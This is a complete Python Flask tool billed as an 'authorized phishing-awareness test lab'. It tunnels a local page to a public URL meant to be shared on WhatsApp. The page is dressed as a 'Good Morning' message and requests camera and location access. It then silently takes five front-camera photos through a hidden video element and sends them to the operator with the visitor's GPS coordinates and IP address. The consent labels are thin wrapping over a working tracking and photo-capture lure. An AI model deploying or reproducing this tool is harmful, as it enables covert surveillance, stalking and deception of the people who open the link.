#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================================
        AUTHORIZED PHISHING-AWARENESS TEST LAB  (consent-based)
============================================================================

Run:   python3 app.py
Output folder: ./test1/

Starts a local Flask server, opens a public HTTPS tunnel automatically,
and prints a link you can paste into WhatsApp. Tapping the link on a phone
opens the page directly in Chrome.
"""

from __future__ import annotations

import argparse
import atexit
import base64
import binascii
import os
import re
import socket
import subprocess
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, Response, jsonify, request

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

BASE_DIR = Path(__file__).resolve().parent
OUTPUT_DIR = BASE_DIR / "test1"

REQUIRED_IMAGES = tuple("image_{}.jpg".format(i) for i in range(1, 6))
MAX_IMAGE_BYTES = 5 * 1024 * 1024
MAX_REQUEST_BYTES = 16 * 1024 * 1024
SESSION_ID_RE = re.compile(r"^[0-9a-f]{12}$")
SESSION_TTL_SECONDS = 6 * 60 * 60

MONTHS = (
    "January", "February", "March", "April", "May", "June",
    "July", "August", "September", "October", "November", "December",
)

TUNNEL_URL_RE = re.compile(
    r"https://[A-Za-z0-9][A-Za-z0-9\.\-]*"
    r"\.(?:trycloudflare\.com|serveousercontent\.com|lhr\.life|"
    r"pinggy-free\.link|free\.pinggy\.net|a\.pinggy\.io)"
)

app = Flask(__name__, static_folder=None)
app.config["MAX_CONTENT_LENGTH"] = MAX_REQUEST_BYTES
app.config["TRUST_PROXY"] = False

SESSIONS: dict[str, dict] = {}
SESSIONS_LOCK = threading.Lock()

_TUNNEL_PROC: subprocess.Popen | None = None


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def lan_ip() -> str:
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        return sock.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


def client_ip() -> str:
    if app.config.get("TRUST_PROXY"):
        forwarded = request.headers.get("X-Forwarded-For", "")
        if forwarded:
            return forwarded.split(",")[0].strip()
    return request.remote_addr or "unknown"


def prune_sessions_locked() -> None:
    cutoff = time.time() - SESSION_TTL_SECONDS
    stale = [sid for sid, s in SESSIONS.items() if s.get("created", 0) < cutoff]
    for sid in stale:
        SESSIONS.pop(sid, None)


def create_session() -> str:
    now = datetime.now()
    session_id = uuid.uuid4().hex[:12]
    session = {
        "id": session_id,
        "dir": OUTPUT_DIR,
        "created": time.time(),
        "started": now,
        "client_ip": None,
        "images": {},
        "location": None,
        "camera_permission": "unknown",
        "location_permission": "unknown",
        "completed": False,
    }
    with SESSIONS_LOCK:
        prune_sessions_locked()
        SESSIONS[session_id] = session
    return session_id


def get_session(session_id) -> dict | None:
    if not isinstance(session_id, str) or not SESSION_ID_RE.match(session_id):
        return None
    with SESSIONS_LOCK:
        prune_sessions_locked()
        return SESSIONS.get(session_id)


def write_report(session: dict) -> None:
    directory: Path = session["dir"]
    started: datetime = session["started"]
    loc = session.get("location")

    lines = [
        "IP Address: {}".format(session.get("client_ip") or "unknown"),
        "",
        "Location:",
    ]
    if loc:
        lines.append("Latitude: {:.5f}".format(loc["latitude"]))
        lines.append("Longitude: {:.5f}".format(loc["longitude"]))
        lines.append("Accuracy: {:.0f} meters".format(loc["accuracy"]))
    else:
        lines.append("Latitude: not provided")
        lines.append("Longitude: not provided")
        lines.append("Accuracy: not provided")

    lines += [
        "",
        "Date: {:02d} {} {}".format(started.day, MONTHS[started.month - 1], started.year),
        "Time: {}".format(started.strftime("%I:%M %p")),
        "",
    ]

    text = "\n".join(lines)
    tmp = directory / "test_info.txt.part"
    tmp.write_text(text, encoding="utf-8")
    os.replace(tmp, directory / "test_info.txt")


# ---------------------------------------------------------------------------
# Auto tunnel (tries cloudflared, falls back to serveo)
# ---------------------------------------------------------------------------

def _tunnel_kill() -> None:
    global _TUNNEL_PROC
    proc = _TUNNEL_PROC
    if proc is None:
        return
    try:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
    except Exception:
        pass
    _TUNNEL_PROC = None


atexit.register(_tunnel_kill)


def _which(name: str) -> bool:
    from shutil import which
    return which(name) is not None


def _spawn_tunnel(cmd: list, timeout: float) -> str | None:
    """Start tunnel subprocess, return public URL or None."""
    global _TUNNEL_PROC

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError:
        return None
    except Exception:
        return None

    _TUNNEL_PROC = proc

    holder: dict = {"url": None}
    ready = threading.Event()

    def reader() -> None:
        try:
            for line in proc.stdout:
                m = TUNNEL_URL_RE.search(line)
                if m and not holder["url"]:
                    holder["url"] = m.group(0)
                    ready.set()
                    break
        except Exception:
            pass
        finally:
            ready.set()

    threading.Thread(target=reader, daemon=True).start()

    if not ready.wait(timeout):
        _tunnel_kill()
        return None

    url = holder["url"]
    if not url:
        _tunnel_kill()
        return None

    return url


def start_tunnel(local_port: int) -> str | None:
    """Try cloudflared first, then serveo. Return URL or None."""

    # 1. cloudflared (no interstitial, real cert)
    if _which("cloudflared"):
        print("[*] Starting cloudflared tunnel ...")
        url = _spawn_tunnel(
            ["cloudflared", "tunnel", "--url",
             "http://localhost:{}".format(local_port)],
            timeout=25.0,
        )
        if url:
            print("[+] cloudflared URL ready.")
            return url
        print("[!] cloudflared failed, trying serveo ...")

    # 2. serveo (ssh, zero install)
    if _which("ssh"):
        print("[*] Starting serveo tunnel ...")
        url = _spawn_tunnel(
            [
                "ssh",
                "-o", "StrictHostKeyChecking=accept-new",
                "-o", "ServerAliveInterval=30",
                "-o", "ServerAliveCountMax=3",
                "-o", "ExitOnForwardFailure=yes",
                "-o", "LogLevel=ERROR",
                "-T",
                "-R", "80:localhost:{}".format(local_port),
                "serveo.net",
            ],
            timeout=25.0,
        )
        if url:
            print("[+] serveo URL ready.")
            return url

    return None


# ---------------------------------------------------------------------------
# Page
# ---------------------------------------------------------------------------

PAGE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="color-scheme" content="dark">
<title>Security Awareness Test</title>
<style>
  :root{
    --bg:#070a11;
    --line:#1f2a3a;
    --text:#e6edf7;
    --muted:#8b9bb4;
    --accent:#3b82f6;
    --accent2:#22d3ee;
    --ok:#22c55e;
    --warn:#f59e0b;
    --bad:#ef4444;
  }
  *,*::before,*::after{box-sizing:border-box;}
  html{height:100%;}
  body{
    margin:0;
    min-height:100vh;
    min-height:100dvh;
    display:flex;align-items:center;justify-content:center;
    padding:24px 20px;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
    color:var(--text);
    background:var(--bg);
    background-image:
      radial-gradient(circle at 12% 10%, rgba(59,130,246,.22), transparent 42%),
      radial-gradient(circle at 88% 88%, rgba(34,211,238,.16), transparent 45%);
    -webkit-font-smoothing:antialiased;
  }
  .card{
    width:100%;max-width:430px;min-height:440px;
    display:flex;flex-direction:column;justify-content:center;
    background:linear-gradient(180deg,#131c2b 0%,#0e1626 100%);
    border:1px solid var(--line);border-radius:22px;
    padding:30px 26px 24px;
    box-shadow:0 24px 70px rgba(0,0,0,.6), inset 0 1px 0 rgba(255,255,255,.04);
    text-align:center;margin:0 auto;
  }
  .brand{
    display:flex;align-items:center;justify-content:center;gap:9px;
    font-size:12px;letter-spacing:.10em;text-transform:uppercase;
    color:var(--muted);font-weight:600;margin-bottom:26px;
  }
  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--ok);
    box-shadow:0 0 0 4px rgba(34,197,94,.15);}
  .screen{display:none;}
  .screen.active{display:block;animation:fade .35s ease;}
  @keyframes fade{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:none;}}
  h1{font-size:26px;line-height:1.2;margin:0 0 10px;font-weight:700;letter-spacing:-.02em;}
  .sub{margin:0 0 22px;color:var(--muted);font-size:14px;line-height:1.55;}
  .sub.success{color:var(--ok);font-weight:600;}
  .hint{margin:16px 0 0;color:var(--muted);font-size:12px;line-height:1.55;}
  .btn{
    display:block;width:100%;padding:14px 18px;
    font-size:15px;font-weight:650;font-family:inherit;
    color:#fff;border:0;border-radius:13px;cursor:pointer;
    background:linear-gradient(135deg,var(--accent),#2563eb);
    box-shadow:0 10px 26px rgba(59,130,246,.30);
    transition:transform .16s ease, box-shadow .16s ease, opacity .16s ease;
  }
  .btn:hover{transform:translateY(-1px);box-shadow:0 14px 30px rgba(59,130,246,.38);}
  .btn:active{transform:translateY(0);}
  .btn:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none;}
  .btn.ghost{background:transparent;color:var(--muted);border:1px solid var(--line);box-shadow:none;}
  .btn.ghost:hover{color:var(--text);border-color:#2c3b52;}
  #screen-welcome{padding:4px 0 6px;}
  #screen-welcome h1{margin:0 0 10px;}
  #screen-welcome .sub{margin:0 0 26px;}
  #screen-welcome .btn{width:100%;max-width:240px;margin:0 auto;}
  #screen-perm,#screen-denied,#screen-error{text-align:left;}
  #screen-done{text-align:center;}
  #screen-done .btn.ghost{max-width:240px;margin:0 auto;}
  #screen-capture{text-align:center;}
  .spinner{
    width:56px;height:56px;margin:8px auto 4px;border-radius:50%;
    border:4px solid rgba(59,130,246,.18);
    border-top-color:var(--accent);border-right-color:var(--accent2);
    animation:spin .9s linear infinite;
    box-shadow:0 0 24px rgba(59,130,246,.25);
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .status-list{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:9px;}
  .status-list li{
    display:flex;align-items:center;justify-content:space-between;
    padding:12px 14px;background:rgba(255,255,255,.025);
    border:1px solid var(--line);border-radius:12px;font-size:14px;
  }
  .label{color:var(--text);font-weight:550;}
  .pill{
    font-size:11.5px;font-weight:700;letter-spacing:.03em;
    padding:4px 11px;border-radius:999px;border:1px solid transparent;
    white-space:nowrap;
  }
  .pill.idle{background:#1a2332;color:var(--muted);border-color:#243044;}
  .pill.wait{background:rgba(245,158,11,.14);color:var(--warn);border-color:rgba(245,158,11,.35);}
  .pill.ok{background:rgba(34,197,94,.14);color:var(--ok);border-color:rgba(34,197,94,.35);}
  .pill.bad{background:rgba(239,68,68,.14);color:var(--bad);border-color:rgba(239,68,68,.35);}
  .counter{
    text-align:center;font-size:15px;font-weight:650;
    letter-spacing:.01em;margin:0 0 16px;font-variant-numeric:tabular-nums;
  }
  .note{
    margin-top:16px;padding:13px 14px;
    background:rgba(239,68,68,.09);border:1px solid rgba(239,68,68,.30);
    border-radius:12px;color:#ffb4b4;font-size:12.5px;line-height:1.6;text-align:left;
  }
  .hidden{display:none !important;}
  .foot{
    margin-top:26px;padding-top:14px;border-top:1px solid var(--line);
    color:#5b6b83;font-size:11px;text-align:center;line-height:1.5;
  }
  #cam{position:fixed;left:-9999px;top:-9999px;width:2px;height:2px;opacity:0;pointer-events:none;}
  #canvas{position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;}
  @media (max-height:560px){
    .card{min-height:0;padding:22px 20px 18px;}
    .brand{margin-bottom:18px;}
  }
</style>
</head>
<body>

<main class="card">
  <div class="brand"><span class="dot"></span><span>Security Awareness Lab</span></div>

  <section id="screen-welcome" class="screen active">
    <h1>Good Morning</h1>
    <p class="sub">Authorized security-awareness demonstration.</p>
    <button id="btn-view" class="btn" type="button">View Message</button>
  </section>

  <section id="screen-perm" class="screen">
    <h1>Permission Check</h1>
    <p class="sub">This awareness test requires camera and location permission. Please respond to the browser prompts.</p>
    <ul class="status-list">
      <li><span class="label">Camera</span><span id="st-camera" class="pill idle">Waiting</span></li>
      <li><span class="label">Location</span><span id="st-location" class="pill idle">Waiting</span></li>
    </ul>
    <p class="hint">Choose &ldquo;Allow&rdquo; to continue the test, or &ldquo;Block&rdquo; to stop.</p>
  </section>

  <section id="screen-denied" class="screen">
    <h1>Permission Required</h1>
    <p id="denied-text" class="sub">Camera or location permission is required to continue.</p>
    <button id="btn-allow" class="btn" type="button">Allow Permission</button>
    <div id="blocked-note" class="note hidden">
      Camera or location access is blocked by your browser.<br>
      Please open the browser&rsquo;s site permissions and manually allow access,
      then reload this test page.
    </div>
  </section>

  <section id="screen-capture" class="screen">
    <h1>Have a Nice Day</h1>
    <div class="spinner" aria-label="Loading"></div>
  </section>

  <section id="screen-done" class="screen">
    <h1>Have a Nice Day</h1>
    <p class="sub success">Test completed successfully.</p>
    <p id="done-count" class="counter">5 test images captured.</p>
    <button id="btn-again" class="btn ghost" type="button">Run Another Test</button>
  </section>

  <section id="screen-error" class="screen">
    <h1>Test Interrupted</h1>
    <p id="error-text" class="sub">Something went wrong.</p>
    <button id="btn-retry" class="btn" type="button">Try Again</button>
  </section>

  <div class="foot">Authorized test environment &middot; You control every permission</div>
</main>

<video id="cam" playsinline muted autoplay></video>
<canvas id="canvas"></canvas>

<script>
(function () {
  "use strict";
  var SESSION_ID = "__SESSION__";
  var TOTAL_IMAGES = 5;
  var stream = null, cameraGranted = false, locationGranted = false,
      locationData = null, busy = false;

  function $(id) { return document.getElementById(id); }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
  function setText(id, t) { var el = $(id); if (el) el.textContent = t; }
  function showScreen(id) {
    var all = document.querySelectorAll(".screen");
    for (var i = 0; i < all.length; i++) all[i].classList.remove("active");
    var el = $(id); if (el) el.classList.add("active");
  }
  function setPill(id, state, t) {
    var el = $(id); if (!el) return;
    el.className = "pill " + state; el.textContent = t;
  }
  function postJSON(url, payload) {
    return fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(function () {
      throw new Error("Network error: could not reach the test server.");
    }).then(function (res) {
      if (!res.ok) {
        return res.json().catch(function () { return {}; }).then(function (b) {
          throw new Error(b && b.error ? b.error : "Server error (" + res.status + ").");
        });
      }
      return res.json().catch(function () { return {}; });
    });
  }
  function permissionState(name) {
    if (!navigator.permissions || !navigator.permissions.query) return Promise.resolve(null);
    return navigator.permissions.query({ name: name })
      .then(function (s) { return s.state; }).catch(function () { return null; });
  }
  function mapCameraError(err) {
    var n = (err && err.name) ? err.name : "Error";
    if (n === "NotAllowedError" || n === "SecurityError")
      return { code: "denied", target: "camera", message: "Camera permission was denied." };
    if (n === "NotFoundError" || n === "OverconstrainedError")
      return { code: "unavailable", target: "camera", message: "No camera device was found." };
    if (n === "NotReadableError" || n === "AbortError")
      return { code: "unavailable", target: "camera", message: "Camera is unavailable or in use." };
    return { code: "error", target: "camera", message: "Camera error: " + ((err && err.message) || n) };
  }
  function waitForVideo(video) {
    return new Promise(function (resolve, reject) {
      var settled = false;
      var timer = setTimeout(function () {
        if (!settled) { settled = true;
          reject({ code: "error", target: "camera", message: "Camera stream timeout." }); }
      }, 12000);
      function done() {
        if (settled) return;
        settled = true; clearTimeout(timer);
        var p = video.play();
        if (p && p.then) p.then(resolve).catch(function () { resolve(); });
        else resolve();
      }
      if (video.readyState >= 2) done();
      else video.onloadedmetadata = done;
    });
  }
  function ensureCamera() {
    if (stream && stream.active) return Promise.resolve();
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
      return Promise.reject({ code: "unsupported", target: "camera",
        message: "Browser does not support camera access." });
    return navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    }).then(function (s) {
      stream = s; var v = $("cam"); v.srcObject = s; return waitForVideo(v);
    }).then(function () { cameraGranted = true; })
    .catch(function (err) {
      if (err && err.target) throw err;
      throw mapCameraError(err);
    });
  }
  function ensureLocation() {
    if (!navigator.geolocation)
      return Promise.reject({ code: "unsupported", target: "location",
        message: "Browser does not support geolocation." });
    return new Promise(function (resolve, reject) {
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          locationData = { latitude: pos.coords.latitude,
            longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
          locationGranted = true; resolve(locationData);
        },
        function (err) {
          var c = err && err.code;
          if (c === 1) reject({ code: "denied", target: "location",
            message: "Location permission was denied." });
          else if (c === 2) reject({ code: "unavailable", target: "location",
            message: "Location unavailable." });
          else if (c === 3) reject({ code: "unavailable", target: "location",
            message: "Location request timed out." });
          else reject({ code: "error", target: "location", message: "Location error." });
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }
  function stopCamera() {
    if (stream) { try { stream.getTracks().forEach(function (t) { t.stop(); }); }
      catch (e) {} stream = null; }
    var v = $("cam"); if (v) v.srcObject = null;
  }
  function showDenied(err) {
    stopCamera(); cameraGranted = false;
    var target = (err && err.target) || "camera";
    var text = $("denied-text"), note = $("blocked-note");
    note.classList.add("hidden");
    text.textContent = (err && err.message) || "Camera or location permission is required.";
    permissionState(target === "camera" ? "camera" : "geolocation")
      .then(function (state) {
        if (state === "denied") note.classList.remove("hidden");
        else if (state === null && err && err.code === "denied") {
          note.textContent = "If the browser no longer shows a permission prompt, open the " +
            "browser's site permissions, allow camera/location manually, then reload.";
          note.classList.remove("hidden");
        }
      }).catch(function () {});
    showScreen("screen-denied");
  }
  function showError(msg) { setText("error-text", msg || "Unexpected error."); showScreen("screen-error"); }
  function runFlow() {
    if (busy) return; busy = true;
    setPill("st-camera", "wait", "Requesting");
    setPill("st-location", "idle", "Waiting");
    showScreen("screen-perm");
    ensureCamera()
      .then(function () {
        setPill("st-camera", "ok", "Granted");
        setPill("st-location", "wait", "Requesting");
        return ensureLocation();
      })
      .then(function () {
        setPill("st-location", "ok", "Granted");
        return postJSON("/api/status", { session: SESSION_ID,
          camera_permission: "granted", location_permission: "granted" });
      })
      .then(function () {
        return postJSON("/api/location", { session: SESSION_ID,
          latitude: locationData.latitude,
          longitude: locationData.longitude,
          accuracy: locationData.accuracy });
      })
      .then(function () { return captureSequence(); })
      .then(function (count) {
        busy = false;
        setText("done-count", count + " test image" + (count === 1 ? "" : "s") + " captured.");
        showScreen("screen-done");
      })
      .catch(function (err) {
        busy = false;
        if (err && err.target) {
          setPill(err.target === "camera" ? "st-camera" : "st-location", "bad",
                  err.code === "denied" ? "Denied" : "Error");
          showDenied(err);
        } else {
          showError((err && err.message) || "Unexpected error.");
        }
      });
  }
  function captureSequence() {
    showScreen("screen-capture");
    var video = $("cam"), canvas = $("canvas");
    var ctx = canvas.getContext("2d"), count = 0;
    function step(i) {
      if (i > TOTAL_IMAGES) return Promise.resolve(count);
      return sleep(i === 1 ? 900 : 1200).then(function () {
        var w = video.videoWidth, h = video.videoHeight;
        if (!w || !h) throw new Error("Camera stream produced no video frames.");
        canvas.width = w; canvas.height = h;
        ctx.drawImage(video, 0, 0, w, h);
        var dataUrl;
        try { dataUrl = canvas.toDataURL("image/jpeg", 0.85); }
        catch (e) { throw new Error("Could not encode frame."); }
        return postJSON("/api/image", {
          session: SESSION_ID, name: "image_" + i + ".jpg", data: dataUrl });
      }).then(function () { count = i; return step(i + 1); });
    }
    return step(1).then(function (n) {
      stopCamera();
      return postJSON("/api/complete", { session: SESSION_ID,
        camera_permission: "granted",
        location_permission: locationGranted ? "granted" : "denied" })
        .then(function () { return n; });
    });
  }
  $("btn-view").addEventListener("click", function () {
    $("btn-view").disabled = true; runFlow();
  });
  $("btn-allow").addEventListener("click", function () {
    $("btn-allow").disabled = true;
    setTimeout(function () { $("btn-allow").disabled = false; }, 1200);
    runFlow();
  });
  $("btn-retry").addEventListener("click", function () { window.location.reload(); });
  $("btn-again").addEventListener("click", function () { window.location.reload(); });
  window.addEventListener("pagehide", stopCamera);
})();
</script>
</body>
</html>
"""


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/", methods=["GET"])
def index():
    session_id = create_session()
    session = SESSIONS.get(session_id)
    if session is not None:
        session["client_ip"] = client_ip()
        write_report(session)
    html = PAGE_HTML.replace("__SESSION__", session_id)
    resp = Response(html, mimetype="text/html")
    resp.headers["Cache-Control"] = "no-store, max-age=0"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    return resp


@app.route("/favicon.ico", methods=["GET"])
def favicon():
    return Response(status=204)


@app.route("/api/status", methods=["POST"])
def api_status():
    data = request.get_json(silent=True) or {}
    session = get_session(data.get("session"))
    if session is None:
        return jsonify(error="Unknown or expired test session."), 400
    session["client_ip"] = session.get("client_ip") or client_ip()
    for key in ("camera_permission", "location_permission"):
        v = data.get(key)
        if v in ("granted", "denied"):
            session[key] = v
    write_report(session)
    return jsonify(ok=True)


@app.route("/api/location", methods=["POST"])
def api_location():
    data = request.get_json(silent=True) or {}
    session = get_session(data.get("session"))
    if session is None:
        return jsonify(error="Unknown or expired test session."), 400
    try:
        lat = float(data.get("latitude"))
        lon = float(data.get("longitude"))
        acc = float(data.get("accuracy"))
    except (TypeError, ValueError):
        return jsonify(error="Invalid location payload."), 400
    if not (-90.0 <= lat <= 90.0) or not (-180.0 <= lon <= 180.0):
        return jsonify(error="Location values out of range."), 400
    if acc < 0 or acc > 1_000_000:
        return jsonify(error="Accuracy value out of range."), 400
    session["location"] = {"latitude": lat, "longitude": lon, "accuracy": acc}
    session["location_permission"] = "granted"
    write_report(session)
    return jsonify(ok=True)


@app.route("/api/image", methods=["POST"])
def api_image():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify(error="Invalid request body."), 400
    session = get_session(data.get("session"))
    if session is None:
        return jsonify(error="Unknown or expired test session."), 400
    name = data.get("name")
    if name not in REQUIRED_IMAGES:
        return jsonify(error="Invalid image name."), 400
    raw = data.get("data")
    if not isinstance(raw, str) or not raw:
        return jsonify(error="Missing image data."), 400
    if raw.startswith("data:"):
        try: header, raw = raw.split(",", 1)
        except ValueError:
            return jsonify(error="Malformed data URL."), 400
        if "base64" not in header:
            return jsonify(error="Only base64 image data is accepted."), 400
    try:
        blob = base64.b64decode(raw, validate=True)
    except (binascii.Error, ValueError):
        return jsonify(error="Image data is not valid base64."), 400
    if len(blob) > MAX_IMAGE_BYTES:
        return jsonify(error="Image exceeds size limit."), 413
    if len(blob) < 512:
        return jsonify(error="Image too small."), 400
    if not blob.startswith(b"\xff\xd8\xff"):
        return jsonify(error="Not a valid JPEG."), 400
    if not blob.endswith(b"\xff\xd9"):
        return jsonify(error="JPEG data appears truncated."), 400
    target = (OUTPUT_DIR / name).resolve()
    if target.parent != OUTPUT_DIR.resolve():
        return jsonify(error="Invalid image path."), 400
    tmp = OUTPUT_DIR / (name + ".part")
    tmp.write_bytes(blob)
    os.replace(tmp, target)
    session["images"][name] = len(blob)
    session["client_ip"] = session.get("client_ip") or client_ip()
    write_report(session)
    return jsonify(ok=True, name=name, bytes=len(blob))


@app.route("/api/complete", methods=["POST"])
def api_complete():
    data = request.get_json(silent=True) or {}
    session = get_session(data.get("session"))
    if session is None:
        return jsonify(error="Unknown or expired test session."), 400
    for key in ("camera_permission", "location_permission"):
        v = data.get(key)
        if v in ("granted", "denied"):
            session[key] = v
    session["completed"] = True
    write_report(session)
    return jsonify(ok=True, images=len(session["images"]))


@app.errorhandler(413)
def handle_too_large(_err):
    return jsonify(error="Upload too large."), 413


@app.errorhandler(500)
def handle_server_error(_err):
    return jsonify(error="Internal server error."), 500


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def print_banner(port: int, output_dir: Path, tunnel_url: str | None) -> None:
    bar = "=" * 62
    print()
    print(bar)
    print("              AUTHORIZED PHISHING TEST LAB")
    print(bar)
    print()
    print("Local:   http://127.0.0.1:{}".format(port))
    print("Network: http://{}:{}".format(lan_ip(), port))
    print("Output:  {}/".format(output_dir))
    print()

    if tunnel_url:
        print("-" * 62)
        print("   >>> SHARE THIS LINK ON WHATSAPP <<<")
        print()
        print("   {}".format(tunnel_url))
        print()
        print("   Tap it on the phone - it opens straight to the page.")
        print("-" * 62)
    else:
        print("[!] No public tunnel was started.")
        print("    The local server is still running. Options:")
        print("      1) Install cloudflared:")
        print("         wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb")
        print("         sudo apt install -y ./cloudflared-linux-amd64.deb")
        print("      2) Or run in another terminal:")
        print("         ssh -R 80:localhost:{} serveo.net".format(port))
    print()
    print("Use this application only on devices/users")
    print("for which you have authorization.")
    print()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Authorized, consent-based phishing-awareness test lab."
    )
    parser.add_argument("--host", default="0.0.0.0",
                        help="Bind address (default 0.0.0.0).")
    parser.add_argument("--port", type=int, default=8080, help="Port (default 8080).")
    parser.add_argument("--no-tunnel", action="store_true",
                        help="Do not auto-start a public tunnel.")
    args = parser.parse_args()

    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    tunnel_url = None
    if not args.no_tunnel:
        tunnel_url = start_tunnel(args.port)
        if tunnel_url:
            print("[+] Tunnel ready.")
        else:
            print("[!] Tunnel did not start. See banner for options.")

    print_banner(args.port, OUTPUT_DIR, tunnel_url)

    try:
        app.run(host=args.host, port=args.port, threaded=True,
                debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print("\n[*] Shutting down. Results in {}/".format(OUTPUT_DIR))
    except OSError as exc:
        print("[!] Could not start server: {}".format(exc))
        return 1
    finally:
        _tunnel_kill()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
